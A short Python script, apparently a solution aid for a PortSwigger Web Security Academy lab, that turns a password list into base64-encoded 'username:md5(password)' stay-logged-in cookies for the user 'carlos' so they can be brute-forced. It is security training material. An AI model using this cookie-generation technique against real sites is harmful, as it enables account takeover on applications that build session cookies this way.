from hashlib import md5
from itsdangerous import base64_encode

# a little code to create Cookies for portswiggers lab:
# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

username = "carlos:" 
cookie_file = open("/home/kali/Documents/Portswigger_labs/Broken Authentication /"+ username[:-1] + "_cookies.txt", "w", encoding='utf-8') # create file to store the hashed cookies
Passwordlist = open("/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt", "r", encoding='utf-8') #provided password list

for word in Passwordlist.readlines():
    enc=word.strip().encode()
    md5str=md5(enc).hexdigest()
    raw_cookie = username + str(md5str)
    b64_cookie = str(base64_encode(raw_cookie), "utf-8")
    cookie_file.write(b64_cookie + "\n")
    print(b64_cookie)

cookie_file.close()

